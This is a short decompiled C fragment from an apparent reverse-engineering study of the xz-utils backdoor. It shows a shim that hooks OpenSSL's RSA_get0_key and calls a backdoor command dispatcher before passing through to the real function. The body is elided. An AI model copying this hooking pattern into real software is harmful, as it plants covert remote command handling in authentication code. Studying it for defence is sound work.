// /home/kali/xzre-ghidra/xzregh/10A330_rsa_get0_key_backdoor_shim.c
// Function: rsa_get0_key_backdoor_shim @ 0x10A330
// Calling convention: __stdcall
// Prototype: void __stdcall rsa_get0_key_backdoor_shim(RSA * r, BIGNUM * * n, BIGNUM * * e, BIGNUM * * d)


/*
 * AutoDoc: Mirrors the EVP hook for RSA_get0_key: any consumer that asks OpenSSL for the modulus/exponent first triggers rsa_backdoor_command_dispatch so the dispatcher can inspect the handle and opportunistically process commands before delegating to the real function.
 */

#include "xzre_types.h"

void rsa_get0_key_backdoor_shim(RSA *r,BIGNUM **n,BIGNUM **e,BIGNUM **d)

{
  ...
  if (((global_ctx != (global_context_t *)0x0) &&
    ...
    if (r != (RSA *)0x0) {
      ...
      rsa_backdoor_command_dispatch(r,global_ctx,&do_orig_flag);
    }
